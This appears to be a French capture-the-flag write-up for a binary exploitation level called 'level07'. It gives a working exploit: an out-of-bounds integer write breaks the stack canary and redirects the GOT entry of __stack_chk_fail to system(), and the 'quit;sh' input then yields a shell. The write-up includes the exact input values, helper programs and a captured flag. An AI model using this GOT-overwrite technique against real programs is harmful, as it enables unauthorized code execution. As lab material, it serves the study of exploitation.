@@ -1,0 +1,72 @@
+ON peux ecrire un int a certaine adresses comme l'addresse de la got de __stack_chk_fail@plt, ainsi il est possible de de casser le canary qui est stock en esp+0x1cc avec tab[106]:
+
+esp+0x1cc = esp+0x24 + 106 * 4
+
+On cherche l'addresse de system avec un autre programme :
+
+foo.c : 
+#include <stdlib.h>
+int main() {system(NULL);}
+
+
+gcc foo.c -m32 -o sys
+gdb sys
+b main
+r
+print system
+
+gdb nous informe donc que system est chargé à l'adresse 0xf7e6aed0.
+
+Un petit travail sur les nombres negatifs en C nous permet de trouver ce que nous devons ecrire dans store pour ecrire cette valeur ci : 
+
+(0xf7e6aed0 ^ 0xFFFFFFFF) + 1 = 135876912
+
+On ecrira donc -135876912 dans le champ Number de la fonction store.
+
+
+Pour l'index, on procède comme suit.
+
+Tab est chargé sur la stack à l'adresse : 0xffffae14 : 4294946324 (susceptible, verifier avec gbd)
+l'adresse de __stack_chk_fail sur la got est à : 0x0804a010 = 134520848 (readelf --relocs level07)
+
+Avec le programme suivant, on va recuperer l'index ou on veut ecrire :
+
+#include <stdio.h>
+
+int main (){
+    long long i1 = 4294946324;
+    long long i2 = 134520848;
+    long long i3 = i2 - i1;
+    printf("%lld\n", i3 / 4);
+}
+
+On veut donc ecrire à -1040106369, ce qu'on convertit en positif :
+
+1040106369 ^ 0xFFFFFFFF + 1 = 3254860927
+
+On ecrit donc :
+
+store
+12
+106
+store
+-135876912
+3254860927
+quit;sh
+
+Ayant cassé le canary, la fonction __stack_chk_fail va etre lancé. Ayant modifie son adresse dans le plt, ce sera system qui sera appele avec comme argument le haut de la stack, donc buff, precedemment rempli par fgets, ici : quit;sh
+On va donc executer quit;sh , ce qui nous lance un shell
+
+flag :
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+
+echo "store
+12
+106
+store
+-135876912
+3254860927
+quit;sh
+"
+
+(Tester avec d'autres valeurs si ca marche pas)
